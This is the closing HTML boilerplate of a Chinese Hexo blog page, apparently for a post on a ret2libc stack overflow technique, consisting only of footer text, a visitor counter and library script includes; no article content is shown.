</span><span class="post-meta-item-icon"><i class="ic i-coffee"></i></span><span title="站点阅读时长">6:23</span></div><div class="powered-by">基于 <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & Theme.<a target="_blank" rel="noopener" href="https://github.com/theme-shoka-x/hexo-theme-shokaX/">ShokaX</a></div></div><script src="https://unpkg.com/busuanzi@2.3.0/bsz.pure.mini.js"></script><div id="busuanzi-wrap"><span class="ic i-eye"></span><span id="busuanzi_container_site_pv">本站访问量 <span id="busuanzi_value_site_pv"></span> 次</span> | <span class="ic i-user"></span><span id="busuanzi_container_site_uv">本站访客量 <span id="busuanzi_value_site_uv"></span> 次</span></div></div></footer></div><script data-config type="text/javascript">var LOCAL={ispost:!0,path:"2022/03/30/stackoverflow-ret2libc/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},nocopy:"false",nocopy:!1,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',copy_tex:!0,katex:!0,mermaid:!1,audio:void 0,fancybox:!0,outime:!0,template:'<div class="note warning"><p><span class="label warning">文章时效性提示</span><br>这是一篇发布于 {{publish}} 天前，最后一次更新在 {{updated}} 天前的文章，部分信息可能已经发生改变，请注意甄别。</p></div>',quiz:{choice:"单选题",multiple:"多选题",true_false:"判断题",essay:"问答题",gap_fill:"填空题",mistake:"错题备注"},ignores:[e=>e.includes("#"),e=>new RegExp(LOCAL.path+"$").test(e),[]]}</script><script src="undefined/undefined" crossorigin="anonymous" fetchpriority="high"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha384-ZvpUoO&#x2F;+PpLXR1lu4jmpXWu80pZlYUAfxl5NsBMWOEPSjUn&#x2F;6Z&#x2F;hRTt8+pR6L4N2" crossorigin="anonymous" fetchpriority="high"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha384-Zm+UU4tdcfAm29vg+MTbfu&#x2F;&#x2F;q5B&#x2F;lInMbMCr4T8c9rQFyOv6PlfQYpB5wItcXWe7" crossorigin="anonymous" fetchpriority="high"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" integrity="sha384-TOxsBplaL96&#x2F;QDWPIUg+ye3v89qSE3s22XNtJMmCeZEep3cVDmXy1zEfZvVv+y2m" crossorigin="anonymous" fetchpriority="high"></script><script src="/js/siteInit.js?v=0.4.25" type="module" fetchpriority="high" defer></script></body></html><!-- rebuild by hexo-renderer-multi-next-markdown-it -->